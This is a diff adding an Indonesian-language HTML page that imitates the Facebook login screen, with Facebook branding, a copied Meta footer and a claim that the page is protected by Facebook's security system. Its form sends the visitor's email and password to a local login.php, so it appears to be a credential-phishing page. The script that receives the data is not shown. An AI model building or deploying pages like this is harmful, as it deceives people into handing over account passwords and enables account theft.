@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Masuk atau Daftar</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        /* INLINE CRITICAL STYLES - biar cepet load */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="left-section">
+            <img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20200%2050%22%3E%3Cpath%20fill%3D%22%231877f2%22%20d%3D%22M30.1%2013.5c-1.5%200-2.7%201.2-2.7%202.7v17.6c0%201.5%201.2%202.7%202.7%202.7h17.6c1.5%200%202.7-1.2%202.7-2.7V16.2c0-1.5-1.2-2.7-2.7-2.7H30.1z%22%2F%3E%3Ctext%20x%3D%2260%22%20y%3D%2230%22%20fill%3D%22%231877f2%22%20font-size%3D%2224%22%20font-weight%3D%22bold%22%3EFacebook%3C%2Ftext%3E%3C%2Fsvg%3E"
+                alt="Facebook" class="fb-logo">
+            <h2>Facebook membantu Anda terhubung dan berbagi dengan orang-orang dalam kehidupan Anda.</h2>
+        </div>
+
+        <div class="right-section">
+            <div class="login-card">
+                <form action="login.php" method="POST" id="loginForm">
+                    <input type="text" name="email" placeholder="Email atau Nomor Telepon" required>
+                    <input type="password" name="password" placeholder="Kata Sandi" required>
+                    <button type="submit" class="login-btn">Masuk</button>
+                </form>
+
+                <a href="#" class="forgot">Lupa kata sandi?</a>
+                <div class="divider"></div>
+                <button class="create-btn" onclick="window.location.href='https://www.facebook.com/r.php'">Buat akun
+                    baru</button>
+            </div>
+            <p class="branding"><strong>Halaman ini dilindungi</strong> oleh sistem keamanan Facebook</p>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="footer-content">
+            <span>Bahasa Indonesia</span> • English (US) • 中文(简体) • Bahasa Melayu •
+            <a href="#">Daftar</a> • <a href="#">Masuk</a> • <a href="#">Messenger</a> •
+            <a href="#">Facebook Lite</a> • <a href="#">Video</a> • <a href="#">Tempat</a> •
+            <a href="#">Game</a> • <a href="#">Marketplace</a> • <a href="#">Meta Pay</a> •
+            <a href="#">Meta Store</a> • <a href="#">Meta Quest</a> • <a href="#">Ray-Ban Meta</a> •
+            <a href="#">Instagram</a> • <a href="#">Threads</a> • <a href="#">Penggalangan Dana</a> •
+            <a href="#">Layanan</a> • <a href="#">Pusat Informasi Pemilu</a> •
+            <a href="#">Kebijakan Privasi</a> • <a href="#">Pusat Privasi</a> •
+            <a href="#">Grup</a> • <a href="#">Tentang</a> • <a href="#">Buat Iklan</a> •
+            <a href="#">Buat Halaman</a> • <a href="#">Pengembang</a> • <a href="#">Karir</a> •
+            <a href="#">Cookie</a> • <a href="#">Pilihan Iklan</a> •
+            <a href="#">Ketentuan</a> • <a href="#">Bantuan</a> •
+            <span>Meta © 2025</span>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
